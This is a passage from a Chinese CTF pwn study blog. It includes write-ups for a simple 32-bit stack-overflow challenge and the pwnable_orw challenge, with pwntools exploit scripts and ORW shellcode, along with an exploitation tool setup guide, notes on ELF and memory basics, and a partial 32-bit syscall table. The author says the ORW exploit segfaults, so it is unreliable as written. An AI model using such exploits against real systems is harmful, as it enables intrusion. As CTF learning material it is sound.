+保护全关，一般保护全关的题目要么特别简单要么特别难。很显然（因为这是我自己做的题），这个是前者。（当然不是所有带有ez的题目都很ez）（但是这个是真ez）
+直接拖到ida一探究竟。
+
+有一个main函数和一个back_door，还有一个overflow和init函数，backdoor里面是一个超级大后门：
+
+main函数里面是init和overflow，一个是初始化，还有一个是一个最简单的栈溢出：
+
+如图可见，这里有一个不安全的gets函数，然后有一个s变量。
+
+点进去之后我们就能发现，从-0x18到+0x04都是本栈帧的模样，然后要输入0x18个字节覆盖char字符串s和一个var_4，输入4个字节覆盖saved register，最后输入4字节的地址来覆盖return地址。
+所需要的地址就是我们的backdoor函数地址…
+
+backdoor的位置在0x080491F0这个位置上，当然我们也可以填入0x08049211这个地址，这样可以跳过上面那个puts函数的调用。不过这里没必要，我们就以backdoor的地址为需要进入的地址：
+exp：
+from pwn import *#32context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)file_addr = &#x27;./overflow_ez_32&#x27;p = process(file_addr)elf = ELF(file_addr)backdoor_addr = 0x080491F0payload = b&#x27;a&#x27;*0x18payload += b&#x27;a&#x27;*0x04payload += p32(backdoor_addr)print(payload)p.sendafter(b&#x27;door?\n&#x27;,payload)p.interactive()
+
+非常简单。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>nxctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnable_orw【有问题】</title>
+    <url>//docx/pwnable_orw%E3%80%90%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%91/</url>
+    <content><![CDATA[
+Shellcode、ORW
+https://buuoj.cn/challenges#pwnable_orw
+
+首先checksec
+
+32位系统下，栈可执行，有金丝雀。看一下代码：
+
+代码相当简单，有一个seccomp的初始化，然后read了一个shellcode（字符串），然后以shellcode字符串的地址直接在栈上执行。根据题目叫做pwn able orw，也就是一道考察ORW syscall的题目。
+查看一下seccomp启用呢？
+
+启用了open、read、write和exit，还有一个什么sigreturn和rt_sigreturn，和一个架构。
+之前写过类似的题目，详细记录在这：shellcode1_dahuan02
+不过这个是32位系统的，我们按照32位做一个ORWshellcode就可以了
+from pwn import *# r = process(&quot;./orw&quot;)r = process(&#x27;./orw&#x27;)elf = ELF(&#x27;./orw&#x27;)# r = remote(&#x27;node5.buuoj.cn&#x27;,27768)bss_addr = elf.bss()# gdb.attach(r,&#x27;b main&#x27;)# shellcode = shellcraft.open(&#x27;flag&#x27;)# shellcode += shellcraft.read(3, bss_addr, 0x100)# shellcode += shellcraft.write(1, bss_addr, 0x100)shellcode = &quot;&quot;&quot;    mov ebx, 0x67616c66    xor ecx, ecx    xor edx, edx    mov eax, 5    int 0x80    mov ebx,3    mov ecx, 0x804a040    xor edx, edx    mov dh, 0x100 &gt;&gt; 8    mov eax,3    int 0x80    mov ebx, 1    mov ecx,0x804a040    xor edx, edx    mov dh, 0x100 &gt;&gt; 8    mov eax,4    int 0x80&quot;&quot;&quot;print(shellcode)shellcode = asm(shellcode, arch = &#x27;i386&#x27;, os=&#x27;linux&#x27;)r.sendline(shellcode)r.interactive()
+
+但是很可惜的是不知道为什么这道题目没有办法写出来。不管是本地还是远程都有段错误。这个段错误非常的奇怪，不知为何就是解决不了。而且我看别人的视频里面的解法里面也是有段错误的，但是非常奇怪别人可以正常获得flag。
+
+
+
+
+3
+read
+0x03
+unsigned int fd
+char *buf
+size_t count
+
+
+
+4
+write
+0x04
+unsigned int fd
+const char *buf
+size_t count
+
+
+5
+open
+0x05
+const char *filename
+int flags
+umode_t mode
+
+
+以后有时间在解决吧。这个问题。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn基础配置</title>
+    <url>//docx/pwn%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[ubuntu系统和windows系统
+做pwn前需要准备的工具：
+一些虚拟机配置鼠标拖拽控制
+这个服务打开即可
+安装软件linux需要在前面加sudo哈
+网络环境配置默认主机有clash或其他vpn工具。
+
+允许局域网和端口要记住并且打开，系统代理在你需要打开vpn的时候打开即可。
+虚拟机调为NAT连接模式。
+
+在ubuntu的settings中proxy（代理）调整为manual（手动），把http和https的proxy改成相应的URL和Port
+
+端口号就和前面的一样，URL就是vmware给虚拟机的地址，查看方式如图所示： 
+
+基础环境配置python3#首先进入root模式sudo apt updatesudo apt install python3sudo apt install python3-pipalias python=&#x27;/usr/bin/python3&#x27;
+
+一般只需要python3，如果需要python2的话可以看：
+python2环境
+按照这样安装一轮应该就可以了，不要乱删东西。如果不想安装pip可以试下面的第二种办法安装pwntools
+Pwntoolspython库
+sudo pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple#或者sudo apt install python3-pwntools
+
+Wine用来在linux环境下使用windows程序的…一般而言不需要
+apt-get install wine
+
+Gdb &amp; pwndbg调试程序
+apt install gdbapt install gitgit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.shvim ~/.gdbinit#进入到vim之后，输入人source [pwndbg的位置]/gdbinit.py#比如:source /home/kanyo/pwndbg/gdbinit.py
+
+One_gadget一种工具，从libc中直接找到一个构造ROP的地址。
+apt install rubyapt install gemgem install one_gadgetpip3 install --break-system-packages ropper #我建议用这个
+
+因为ROPgadget需要用grep管道指令搜索，有点麻烦
+可以直接用ropper来查询
+ropper --file [filename] --search &#x27;[words]&#x27;
+
+LibcSearcher#libcSearcher有时候不会准，这里提供一个网站：#http://libc.blukat.me#下面是libc安装git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython setup.py develop
+
+main_arena_offset堆题
+https://github.com/bash-c/main_arena_offset#shell脚本，直接下载使用即可，用来搜索堆偏移量的https://github.com/zarkivy/py_main_arena_offset#这个是python包装好的，内核还是上面的shell脚本，不过可以在python里面使用
+
+seccomp-tools用来查被禁用的syscall的
+sudo apt install gcc ruby-dev #依赖sudo gem install seccomp-tools
+
+其他常用apt install vimapt install checksec
+
+IDA Prowindows下直接安装即可
+alpha3.git这个软件是用来shellcode字符化的，但是真的他妈的太难用了。
+看这个吧：alpha3.py
+AE64alpha3对32位的shellcode适配性比较高，不过我们可以试试这个AE64来写64位的题目：
+git clone https://github.com/veritas501/ae64.git --depth 1cd ae64sudo python3 setup.py install
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-前提</tag>
+        <tag>计算机原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn及计算机原理基础知识</title>
+    <url>//docx/pwn%E5%8F%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[PWN是什么PWN是一个俗语，每次攻破某个服务或者系统就是“pwn进去了”，也就是：
+破解、利用成功（二进制漏洞） 
+攻破（设备、服务器）
+控制（设备、服务器）
+流程如下：
+Exploit：用于攻击的脚本和方案 
+Payload：攻击载荷，也就是构造的恶意数据 
+Shellcode：调用攻击目标shell的代码
+二进制基础C语言编译流程c&#x2F;c++在整个世界里面就和超级搅屎棍一样，一方面因为他真的很优秀，一方面因为时代局限性，导致有很多含有漏洞的程序在世界各处到处都有。
+当我拥有一个c语言程序，例如：
+#include&lt;stdio.h&gt;int main()&#123;    puts(&quot;Helloworld&quot;);    return 0;&#125;
+
+我们对他进行编译：
+gcc helloworld.c
+
+就可以得到一个二进制程序a.out
+
+a.out的内容如下：
+@ @@@���uu   ���-�=�=X`�-�=�=�8880hhh��S�td8880P�td   44Q�tdR�td�-�=�=HH/lib64/ld-linux-x86-64.so.2 GNU���GNU          ����c�e���w��U+``~���FDO&#123;&quot;type&quot;:&quot;deb&quot;,&quot;os&quot;:&quot;ubuntu&quot;,&quot;name&quot;:&quot;glibc&quot;,&quot;version&quot;:&quot;2.40-1ubuntu3.1&quot;,&quot;architecture&quot;:&quot;amd64&quot;&#125;GNU��e�mH d s &quot;puts__libc_start_main__cxa_finalizelibc.so.6GLIBC_2.2.5GLIBC_2.34_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable&#x27;u�i        1���=�@�?�?�?�?�?�?��H�H��/H��t��H���5�/�%�/@��h�����f����%�/fD���%v/fD��1�I��^H��H���PTE1�1�H�=��S/�f.�H�=y/H�r/H9�tH�6/H��t        �����H�=I/H�5B/H)�H��H��?H��H�H��tH�/H����fD�����=/u+UH�=�.H��t                                                                               H�=�.�����d�����.]������w�����UH��H��H��������]���H�H��helloworld4���h0����@����P���P9����zRx                                                                        ����&amp;D$4���� FJ                                                                                       �?�9*3$&quot;\���Ut�����q���E�C@&#x27;h������o �H� �?��  ������o����o���o~���o�=@GCC: (Ubuntu 14.2.0-4ubuntu2) 14.2.0��        � ��� �3IU�=|@��=������� ��Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryhelloworld.c__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTableputs@GLIBC_2.2.5_edata_fini__data_start__gmon_start____dso_handle_IO_stdin_used_end__bss_startmain__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.package.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#886hh$I��pW�� e���o  o�  �  4�H H ����=�-                          Hw������o~~����o�����B��   �@@�PP�``�hh                �=���?�@@00%80` �3�x5(
+
+我们可以从中看到一些看得懂的和大量看不懂的内容，其中绝大部分都是无法查看的二进制数据（机器码），而那些可以看出来的二进制数据，可以看到许多信息。这到底是什么文件呢，我们可以file一下。
+
+我们可以发现他是一个ELF（linux下可执行文件格式），64位的文件。
+
+如图所示，C语言到可执行程序的流程也就是_编译(compilier)，汇编(assembler)，和链接（linker)_
+
+可执行文件什么是可执行文件  广义上，可执行文件就是可以执行的文件，比如说python文件在python环境下就可以直接执行（因为他是一个脚本）。
+  狭义上，可执行文件必须是一个经历过编译，汇编和链接后得到的二进制文件，并且在环境合适的情况下可以直接打开运行。也就是说CPU可以直接认识，比如.out.exe.dll.so文件
+  所谓的二进制漏洞，都是在狭义上的程序中的漏洞。
+可执行文件的分类Windows为**PE（portable Executable）**
+
+可执行程序：.exe 
+动态链接库：.dll 
+静态链接库：.lib
+Linux为**ELF（Executable and Linkable Format）**
+
+可执行程序：.out 
+动态链接库：.so 
+静态链接库：.a
+ELF文件、内存加载和虚拟内存ELF文件结构  段视图（Segment View）：用于进程在内存区域中读、写、执行（rwx）权限划分
+  节视图（Section View）：一个ELF文件编译链接时候，在磁盘上存储时的文件结构组织
+  一个段可包含多个节，节是段的细分单元。(不准确，映射关系中，进入内存后看起来段是高于节的）
+   不过大部分时候，不是严格区分成两个部分的，而是要根据不同的需求做不同的分析的。
+
+  比如说在程序从普通存储在硬盘状态到内存中运行的状态，就要从一种段视图的角度转移到节视图。如图所示，一个存储在Disk的程序变为进程进入Memory的时候，其中_**可读可写的.data.bss.got.plt段 **_就变成了Memory中的 Data节 ，很显然，Code节也是一样的由多个段组成的。而程序运行后又产生了新的节，例如stack（栈）和heap（堆）部分…
+虚拟内存  程序在调试的时候需要查看内存里面的内容，但是很可惜真实的内存因为一些机制难以查看。
+  在硬件层面，cpu和memory之间互相沟通没有问题，但是作为程序员是没有办法和硬件沟通的，于是通过OS，OS将物理内存（memory）给抽象出来。
+  OS通过软件机制将物理内存、外存（硬盘）等资源整合后，向程序员呈现的 “逻辑内存”。
+地址空间的隔离与映射_**虚拟内存用户空间每个进程各一份，**_每个程序各自占用独立的空间，例如在32位系统中，默认会划分给2^32byte，也就是4GB空间的大小。
+
+将CPU中的内存管理单元（MMU）和OS维护的页表（Page Table）实现映射。
+
+  因为所有的数据都需要内核，因此_虚拟内存内核空间所有进程共享一份_
+  最后，虚拟内存mmap段中的动态链接库（glibc）仅在物理内存中装载一份。虽然在每个程序的虚拟内存中都存在一份。
+内存空间
+如图所示，32位和64位的系统分别创造出来的空间大小各不相同。依次介绍一下分出来的各个部分分别是干嘛的。
+
+首先是Kernel Space，就是映射出来的内核空间。
+
+stack和heap都是动态存储各种数据的地方。
+
+下面都是静态存储区。
+
+RW段（可读可写，一般是.bss.data等) 
+ReadOnly段（只读，例如.init_array、.fini_array等） 
+RE段（可读可执行，一般是.init、.rodata、.text等)
+Reserved是保留部分。
+
+段（segment）与节（section）概述1. 代码段（Text segment）功能：存储代码与只读数据(ReadOnly)
+
+包含节：
+
+  `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.text&lt;/font&gt;` 节（核心代码存储） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.rodata&lt;/font&gt;` 节（只读常量，如字符串字面量 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.hash&lt;/font&gt;` 节（符号哈希表，辅助符号查找 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.dynsym&lt;/font&gt;` 节（动态链接符号表 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.dynstr&lt;/font&gt;` 节（动态链接符号名字符串 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.plt&lt;/font&gt;` 节（过程链接表，用于延迟绑定 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.rel.got&lt;/font&gt;` 节（全局偏移表重定位信息 ）
+
+2. 数据段（Data segment）功能：存储可读可写数据(Read Write)
+
+包含节：
+
+  `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.data&lt;/font&gt;` 节（已初始化全局 / 静态变量 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.dynamic&lt;/font&gt;` 节（动态链接相关信息，如依赖库 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.got&lt;/font&gt;` 节（全局偏移表，加速地址访问 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.got.plt&lt;/font&gt;` 节（针对 plt 的全局偏移表 ） `&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;.bss&lt;/font&gt;` 节（未初始化 / 初始化为 0 的全局 / 静态变量，运行时分配内存 ）
+
+3. 栈段（Stack segment）通常用于函数调用上下文、局部变量存储，由系统自动管理栈帧分配与释放
+
+程序数据如何在内存中组织
+一开始，有两个全局变量。其中glb存放在内存中的.Bss节部分（因为他没有被初始化）。Bss的其中之一的作用就是存储未初始化的变量。在运行时候分配内存（静态变量也是如此）。
+而在char* str中，其中str放在了Data节部分，也就是已经被初始化的变量存储部分。然后”Helloworld”因为是一个字符串，一个只读数据，所以就被放在了Text段中（一般是Text段里面的.rodata节）
+然后所有的函数存放在了Text段的text节里面，例如sum、main等等。在程序运行中，所有在函数中的变量（函数的内存开销）都被放在了Stack，也就是栈里面。
+在程序中有void* ptr&#x3D;malloc(0x100);其中这个0x100的空间就通过malloc申请到Heap里面了。如此这般，read函数读取到的”deadbeef”就被读取到Heap里面存储着了，也就是堆里。
+大端序和小端序小端序 低地址存放数据低位，高地址存放数据高位。主流格式
+大端序 低地址存放数据高位，高地址存放数据低位
+
+比如说我现在
+char* str = &quot;ABC&quot;;
+
+就可以得到【ABC\0】这个字符串，分别的ASCII码的十六进制是41,42,43,00,合在一起数据就变成了”00434241”。
+其中数据最低位为41，数据最高位为00。数据低位放在内存低位，数据高位内存高位（如小端序解释图所示）。
+程序的装载与进程的执行
+越靠近CPU的存储器，速度越快，价格越高昂，而且存储空间越小。而Register（寄存器）就是一个速度极快的存储器。
+寄存器
+寄存器一共就四个任务：
+第一是把数据存到寄存器中 
+第二是把寄存器中的东西存放到另一个寄存器上 
+第三是把内存中地址上数据获取后存放到寄存器中 
+第四是把寄存器的数据存到地址上去
+一、amd64 寄存器结构（以 RAX 为例的分级访问）amd64 架构中，&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;RAX&lt;/font&gt; 是 8 字节（64 位）通用寄存器，支持向下兼容的分级访问：
+
+&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;rax&lt;/font&gt;：完整 8 字节（64 位）寄存器，可存 64 位数据。
+&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;eax&lt;/font&gt;：低 4 字节（32 位），兼容 32 位程序，存 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;rax&lt;/font&gt; 的低 32 位数据。
+&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;ax&lt;/font&gt;：低 2 字节（16 位），兼容 16 位程序，存 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;rax&lt;/font&gt; 的低 16 位数据。
+&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;ah&lt;/font&gt;：&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;ax&lt;/font&gt; 的高 1 字节（8 位），存 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;ax&lt;/font&gt; 的高 8 位。
+&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;al&lt;/font&gt;：&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;ax&lt;/font&gt; 的低 1 字节（8 位），存 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;ax&lt;/font&gt; 的低 8 位。
+
+这种设计让程序能灵活处理不同位数的数据（64&#x2F;32&#x2F;16&#x2F;8 位），适配旧代码兼容需求。
+二、部分寄存器的功能
+RIP（程序计数器指针寄存器）（Program Counter）
+存当前下一条指令的偏移地址。
+
+
+RSP（栈指针寄存器）
+存当前栈帧的栈顶偏移地址，栈是 “后进先出” 的内存区域（如函数调用时局部变量、返回地址的存储 ），&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;RSP&lt;/font&gt; 随栈操作（&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;push&lt;/font&gt;&#x2F;&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;pop&lt;/font&gt; ）动态变化，始终指向栈顶位置。
+
+
+RBP（基址指针寄存器）
+存当前栈帧的栈底偏移地址，用于定位栈内数据（如函数局部变量相对于栈底的偏移 ），辅助访问栈帧中的内容，常配合 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;RSP&lt;/font&gt; 管理函数调用栈。
+
+
+RAX（通用寄存器）
+作为通用寄存器，可临时存各种数据；特殊功能是存放函数返回值（如 C 语言中 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;int&lt;/font&gt;&#x2F;&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;long long&lt;/font&gt; 等类型的返回值，会通过 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;RAX&lt;/font&gt; 传递 ）。
+
+
+
+静态链接的程序的执行过程
+fork函数当我们开始运行程序的时候，随后运行fork()函数
+fork()在这张图的意思大概如下：我运行一个helloworld程序，需要用到一些内核kernel的东西。于是乎在我运行，也就是 $ ./binary的时候，shell使用fork函数复制自己，他会在父进程（也就是我的系统）中分裂出一个子进程（也就是./binary程序）。然后当子进程需要用到和修改父进程（kernel中的内容）的时候，fork函数就会复制一份数据（在初始阶段共享所有的数据（全局、 栈区、 堆区、 代码）)到子进程中。所以在程序运行的时候，fork函数就是做这个的。
+再单独解释一下fork函数，它的作用是从主进程中分裂出一个进程，他们之间是父子进程的关系。然后fork函数会返回一个int类型，这个int类型就是进程号。
+fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：
+  在父进程中，fork返回新创建子进程的进程ID； 在子进程中，fork返回0； 如果出现错误，fork返回一个负值；
+因此我们可以通过fork返回的值来判断当前进程是子进程还是父进程。（注： fork 调用生成的新进程与其父进程谁先执行不一定，哪个进程先执行要看系统的进程调度策略）
+execve函数当然上述过程只是创建了一个进程，而进程中没有需要运行的内容，execve函数就是用来把./binary里面的内容（也就是需要运行的程序本身）放到子进程中的
+子进程调用 execve(&quot;./binary&quot;, argv[], envp[]) ，目的是用新程序（./binary ）替换当前子进程的内存空间：
+argv[]：传递程序运行参数（比如 ./binary arg1 arg2 里的参数 ）。 envp[]：传递环境变量（比如 PATH``HOME 等 ）。
+内核态切换与处理execve() 会触发系统调用，进入内核态（Kernel mode）：
+  先调用 sys_execve() （内核层的系统调用处理函数 ），再调用 do_execve() 。
+  do_execve() 会执行 search_binary_handler() ，作用是查找能处理该可执行文件的加载器（因为是静态链接的 ELF 文件，会找到 ELF 加载器 ）。
+  找到后调用 load_elf_binary() ，负责加载 ELF 文件到内存（解析文件头、分配内存、加载代码段 &#x2F; 数据段等 ）。
+sys_execve()和do_execve()简单来说，&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;sys_execve()&lt;/font&gt; 是系统调用处理函数，是用户态到内核态的接口之一。在 Linux 内核里，每个系统调用都有对应的处理函数，&lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;sys_execve()&lt;/font&gt; 就是处理 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;execve()&lt;/font&gt; 系统调用的函数，对用户请求进行初步审核和预处理；而 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;do_execve()&lt;/font&gt; 则是是内核中真正执行程序加载和执行关键操作的函数，属于 &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;sys_execve()&lt;/font&gt; 处理流程的下一级，真正去操办程序加载运行的各项事务。
+它们共同协作，完成从用户请求运行程序到程序成功加载运行的整个过程。
+search_binary_handler()和load_elf_binary()  &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;search_binary_handler()&lt;/font&gt;：负责识别文件格式，通过遍历格式处理器链表找到能处理当前文件的加载器。
+  &lt;font style=&quot;background-color:rgb(187,191,196);&quot;&gt;load_elf_binary()&lt;/font&gt;：负责 ELF 文件的具体加载，包括内存映射、环境设置、动态链接等，最终让程序得以执行。也就是让程序可以静态调试的主要函数。
+_start和main()  没什么好说，就是启动后让用户可以看到程序的最后一步。
+动态连接的程序的执行过程
+相比于静态储存，多了一个ld.so和__libc_start_main()和_init。这些是额外处理共享库加载、初始化和运行时支持。
+分别依赖库是ld.so解决函数库地址映射关系之类的，加载是__libc_start_main()把这些东西放到，初始化是_init。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-前提</tag>
+        <tag>计算机原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>syscall调用表32位</title>
+    <url>//docx/syscall%E8%B0%83%E7%94%A8%E8%A1%A832%E4%BD%8D/</url>
+    <content><![CDATA[
+
+
+Num
+syscall
+%eax
+arg0 (%ebx)
+arg1 (%ecx)
+arg2 (%edx)
+arg3 (%esi)
+arg4 (%edi)
+arg5 (%ebp)
+
+
+
+0.
+restart_syscall
+0.
+-
+-
+-
+-
+-
+-
+
+
+1.
+exit
+1.
+int error_code
+-
+-
+-
+-
+-
+
+
+2.
+fork
+2.
+-
+-
+-
+-
+-
+-
+
+
+3.
+read
+3.
+unsigned int fd
+char *buf
+size_t count
+-
+-
+-
+
+
+4.
+write
+4.
+unsigned int fd
+const char *buf
+size_t count
+-
+-
+-
+
+
+5.
+open
+5.
+const char *filename
+int flags
+umode_t mode
+-
+-
+-
+
+
+6.
+close
+6.
+unsigned int fd
+-
+-
+-
+
+-
+
+
+7.
+waitpid
+7.
+pid_t pid
+int *stat_addr
+int options
+-
+-
+-
+
+
+8.
+creat
+8.
+const char *pathname
+umode_t mode
+-
+-
+-
+-
+
+
+9.
+link
+9.
+const char *oldname
+const char *newname
+-
+-
+-
+-
+
+
+10.
+unlink
+10.
+const char *pathname
+-
+-
+-
+-
+-
+
+
+11.
+execve
+11.
+const char *filename
+const char *const *argv
+const char *const *envp
+-
+-
+-
+
+
+12.
+chdir
+12.
+const char *filename
+-
+-
+-
+-
+-
+
+
+13.
+time
+13.
+time_t *tloc
+-
+-
+-
+-
+-
+
+
+14.
+mknod
+14.
+const char *filename
+umode_t mode
+unsigned dev
+-
+-
+-
+
+
+15.
+chmod
+15.
+const char *filename
+umode_t mode
+-
+-
+-
+-
+
+
+16.
+lchown
+16.
+const char *filename
+uid_t user
+gid_t group
+-
+-
+-
+
+
+17.
+break
+17.
+?
+?
+?
+?
+?
+?
+
+
+18.
+oldstat
+18.
+?
+?
+?
+?
+?
+?
+
+
+19.
+lseek
+19.
+unsigned int fd
+off_t offset
+unsigned int whence
+-
+-
+-
+
+
+20.
+getpid
+20.
+-
+-
+-
+-
+-
+-
+
+
+21.
+mount
+21.
+char *dev_name
+char *dir_name
+char *type
+unsigned long flags
+void *data
+-
+
+
+22.
+umount
+22.
+char *name
+int flags
+-
+-
+-
+-
+
+
+23.
+setuid
+23.
+uid_t uid
+-
+-
+-
+-
+-
+
+
+24.
+getuid
+24.
+-
+-
+-
+-
+-
+-
+
+
+25.
+stime
+25.
+time_t *tptr
+-
+-
+-
+-
+-
+
+
+26.
+ptrace
+26.
+long request
+long pid
+unsigned long addr
+unsigned long data
+-
+-
+
+
+27.
+alarm
+27.
+unsigned int seconds
+-
+-
+-
+-
+-
+
+
+28.
+oldfstat
+28.
+?
+?
+?
+?
+?
+?
+
+
+29.
+pause
+29.
+-
+-
+-
+-
+-
+-
+
+
+30.
+utime
+30.
+char *filename
+struct utimbuf *times
+-
+-
+-
+-
+
+
+31.
+stty
+31.
+?
+?
+?
+?
+?
+?
+
+
+32.
+gtty
+32.
+?
+?
+?
+?
+?
+?
+
+
+33.
+access
+33.
+const char *filename
+int mode
+-
+-
+-
+-
+
+
+34.
+nice
+34.
+int increment
+-
+-
+-
+-
+-
+
+
+35.
+ftime
+35.
+?
+?
+?
+?
+?
+?
+
+
+36.
+sync
+36.
+-
+-
+-
+-
+-
+-
+
+
+37.
+kill
+37.
+pid_t pid
+int sig
+-
+-
+-
+-
+
+
+38.
+rename
+38.
+const char *oldname
+const char *newname
+-
+-
+-
+-
+
+
+39.
+mkdir
+39.
+const char *pathname
+umode_t mode
+-
+-
+-
+-
+
+
+40.
+rmdir
+40.
+const char *pathname
+-
+-
+-
+-
+-
+
+
+41.
+dup
+41.
+unsigned int fildes
+-
+-
+-
+-
+-
+
+
+42.
+pipe
+42.
+int *fildes
+-
+-
+-
+-
+-
+
+
+43.
+times
+43.
+struct tms *tbuf
+-
+-
+-
+-
+-
+
+
+44.
+prof
+44.
+?
+?
+?
+?
+?
+?
+
+
+45.
+brk
+45.
+unsigned long brk
+-
+-
+-
+-
+-
+
+
+46.
+setgid
+46.
+gid_t gid
+-
+-
+-
+-
+-
+
+
+47.
+getgid
+47.
+-
+-
+-
+-
+-
+-
+
+
+48.
+signal
+48.
+int sig
+__sighandler_t handler
+-
+-
+-
+-
+
+
+49.
+geteuid
+49.
+-
+-
+-
+-
+-
+-
+
+
+50.
+getegid
+50.
+-
+-
+-
+-
+-
+-
+
+
+51.
+acct
+51.
+const char *name
+-
+-
+-
+-
+-
+
+
+52.
+umount2
+52.
+?
+?
+?
+?
+?
+?
+
+
+53.
+lock
+53.
+?
+?
+?
+?
+?
+?
+
+
+54.
+ioctl
+54.
+unsigned int fd
+unsigned int cmd
+unsigned long arg
+-
+-
+-
+
+
+55.
+fcntl
+55.
+unsigned int fd
+unsigned int cmd
+unsigned long arg
+-
+-
+-
+
+
+56.
+mpx
+56.
+?
+?
+?
+?
+?
+?
+
+
+57.
+setpgid
+57.
+pid_t pid
+pid_t pgid
+-
+-
+-
+-
+
+
+58.
+ulimit
+58.
+?
+?
+?
+?
+?
+?
+
+
+59.
+oldolduname
+59.
+?
+?
+?
+?
+?
+?
+
+
+60.
+umask
+60.
+int mask
+-
+-
+-
+-
+-
+
+
+61.
+chroot
+61.
+const char *filename
+-
+-
+-
+-
+-
+
+
+62.
+ustat
+62.
+unsigned dev
+struct ustat *ubuf
+-
+-
+-
+-
+
+
+63.
+dup2
+63.
+unsigned int oldfd
+unsigned int newfd
+-
+-
+-
+-
+
+
+64.
+getppid
+64.
+-
+-
+-
+-
+-
+-
+
+
+65.
+getpgrp
+65.
+-
+-
+-
+-
+-
+-
+
+
+66.
+setsid
+66.
+-
+-
+-
+-
+-
+-
+
+
+67.
+sigaction
+67.
+int
+const struct old_sigaction *
+struct old_sigaction *
+-
+-
+-
+
+
+68.
+sgetmask
+68.
+-
+-
+-
+-
+-
+-
+
+
+69.
+ssetmask
+69.
+int newmask
+-
+-
+-
+-
+-
+
+
+70.
+setreuid
+70.
+uid_t ruid
+uid_t euid
+-
+-
+-
+-
+
+
+71.
+setregid
+71.
+gid_t rgid
+gid_t egid
+-
+-
+-
+-
+
+
+72.
+sigsuspend
+72.
+int unused1
+int unused2
+old_sigset_t mask
+-
+-
+-
+
+
+73.
+sigpending
+73.
+old_sigset_t *uset
+-
+-
+-
+-
+-
+
+
+74.
+sethostname
+74.
+char *name
+int len
+-
+-
+-
+-
+
+
+75.
+setrlimit
+75.
+unsigned int resource
+struct rlimit *rlim
+-
+-
+-
+-
+
+
+76.
+getrlimit
+76.
+unsigned int resource
+struct rlimit *rlim
+-
+-
+-
+-
+
+
+77.
+getrusage
+77.
+int who
+struct rusage *ru
+-
+-
+-
+-
+
+
+78.
+gettimeofday
+78.
+struct timeval *tv
+struct timezone *tz
+-
+-
+-
